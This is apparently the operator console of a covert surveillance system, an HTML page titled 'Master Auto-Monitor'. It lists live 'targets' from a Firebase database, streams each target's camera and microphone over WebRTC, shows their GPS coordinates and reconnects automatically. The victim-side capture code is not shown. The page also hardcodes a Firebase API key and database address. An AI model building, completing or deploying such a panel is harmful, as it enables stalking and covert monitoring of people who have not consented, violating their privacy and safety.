<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Master Auto-Monitor</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; display: flex; margin: 0; height: 100vh; }
        #list { width: 250px; border-right: 1px solid #0f0; padding: 10px; overflow-y: auto; }
        #view { flex: 1; display: flex; flex-direction: column; padding: 20px; }
        .target { border: 1px solid #0f0; padding: 10px; margin-bottom: 10px; cursor: pointer; }
        .target.active { background: #040; }
        #vid-box { width: 100%; flex: 1; background: #111; border: 2px solid #0f0; position: relative; }
        video { width: 100%; height: 100%; object-fit: contain; }
        #overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); 
                   display: flex; justify-content: center; align-items: center; color: white; cursor: pointer; z-index: 10; }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div id="list">
        <h3>LIST TARGET</h3>
        <div id="targets"></div>
    </div>
    <div id="view">
        <div id="vid-box">
            <!-- Overlay untuk memicu suara (syarat browser) -->
            <div id="overlay">KLIK DI SINI UNTUK AKTIFKAN MONITORING</div>
            <video id="rv" autoplay playsinline></video>
        </div>
        <p id="meta">Pilih target...</p>
    </div>

    <script>
        const config = {
            apiKey: "AIzaSyAQn-HOc2ut9_Dcw0LiPhvUMfzrjaLhj2Q",
            databaseURL: "https://chatroom-e9b3f-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "chatroom-e9b3f"
        };
        firebase.initializeApp(config);
        const rootDb = firebase.database().ref('v5_multi');

        let currentId = null;
        let pc = null;
        let isActivated = false;

        // Klik overlay untuk mengizinkan audio selamanya di sesi ini
        document.getElementById('overlay').onclick = function() {
            this.classList.add('hidden');
            isActivated = true;
            document.getElementById('rv').play();
        };

        rootDb.on('value', snapshot => {
            const cont = document.getElementById('targets');
            cont.innerHTML = "";
            const data = snapshot.val();
            if (!data) return;

            Object.keys(data).forEach(id => {
                const t = data[id];
                if (Date.now() - t.status.lastSeen < 15000) {
                    const d = document.createElement('div');
                    d.className = "target " + (id === currentId ? 'active' : '');
                    d.innerHTML = `ID: ${id}<br><small>LIVE</small>`;
                    d.onclick = () => selectTarget(id);
                    cont.appendChild(d);
                    
                    // AUTO-RECONNECT: Jika target yang sedang dilihat kirim offer baru (refresh)
                    if (id === currentId && t.sdp && t.sdp.offer && t.sdp.offer.ts > (window.lastOfferTs || 0)) {
                        window.lastOfferTs = t.sdp.offer.ts;
                        connect(id, t.sdp.offer);
                    }
                }
            });
        });

        async function connect(id, offer) {
            if (pc) pc.close();
            pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
            
            pc.ontrack = e => {
                const rv = document.getElementById('rv');
                rv.srcObject = e.streams[0];
                if(isActivated) rv.muted = false;
            };

            pc.onicecandidate = e => {
                if (e.candidate) rootDb.child(id + '/ice_m').push(e.candidate.toJSON());
            };

            await pc.setRemoteDescription(new RTCSessionDescription(offer));
            const answer = await pc.createAnswer();
            await pc.setLocalDescription(answer);
            rootDb.child(id + '/sdp/answer').set({ type: answer.type, sdp: answer.sdp });

            rootDb.child(id + '/ice_t').on('child_added', s => {
                pc.addIceCandidate(new RTCIceCandidate(s.val()));
            });
        }

        function selectTarget(id) {
            currentId = id;
            window.lastOfferTs = 0; // Trigger reconnection
            rootDb.child(id + '/status').once('value', s => {
                const d = s.val();
                document.getElementById('meta').innerText = `Target: ${id} | Loc: ${d.lat}, ${d.lng}`;
            });
        }
    </script>
</body>
</html>
